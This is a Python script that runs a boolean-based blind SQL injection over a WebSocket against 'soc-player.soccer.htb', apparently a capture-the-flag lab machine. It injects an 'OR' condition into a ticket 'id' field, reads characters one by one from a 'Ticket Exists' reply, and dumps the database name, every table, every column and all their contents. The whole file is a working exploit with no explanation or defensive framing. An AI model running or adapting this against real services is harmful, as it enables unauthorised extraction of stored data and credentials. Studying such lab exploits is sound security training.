#!./venv/bin/python3

import asyncio
import requests
from websockets import connect
from json import dumps
from string import ascii_letters, digits, punctuation

async def send(soc, payload: dict) -> bool:
    await soc.send(dumps(payload))
    response = await soc.recv()
    return response == "Ticket Exists"

async def attempt(soc, sql) -> bool:
    payload = {"id": f"1 OR ({sql}) #"}
    return await send(soc, payload)

async def enumText(soc, sql) -> str:
    text = ascii_letters + digits + punctuation
    result = ""
    foundChar = True
    
    while foundChar:
        foundChar = False
        for character in text:
            payload = f"ascii(substr(({sql}), {len(result) + 1}, 1)) = {ord(character)}"
            if await attempt(soc, payload):
                result += character
                foundChar = True

            print(result + character, end='\r', flush=True)

    print("")
    return result

async def enumMultipleText(soc, sql) -> list:
    result = []
    output = "placeholder"

    index = 0
    while len(output) > 0:
        output = await enumText(soc, f"{sql} limit {index},1")
        index += 1
        if len(output) > 0:
            result.append(output)

    return result

async def enumContent(soc, schema:dict) -> dict:
    result = {}
    for table, columns in schema.items():
        columns_result = {}
        for column in columns:
            content = await enumMultipleText(soc, f"select {column} from {table}")
            columns_result[column] = content
        result[table] = columns_result

    return result

async def enumColumns(soc, tables: list) -> dict:
    result = {}
    for table in tables:
        columns = await enumMultipleText(soc, f"select column_name from information_schema.columns where table_name = '{table}'")
        result[table] = columns

    return result

async def enumTables(soc, database) -> list:
    return await enumMultipleText(soc, f"select table_name from information_schema.tables where table_schema = '{database}'")

async def main():
    async with connect("ws://soc-player.soccer.htb:9091") as soc:
        database = await enumText(soc, "database()")
        tables = await enumTables(soc, database)
        columns = await enumColumns(soc, tables)
        content = await enumContent(soc, columns)
        print("\nResults :")
        print(f"Database: {database}")
        print(f"Content: {dumps(content, indent=2)}")

if __name__ == "__main__":
    asyncio.run(main())

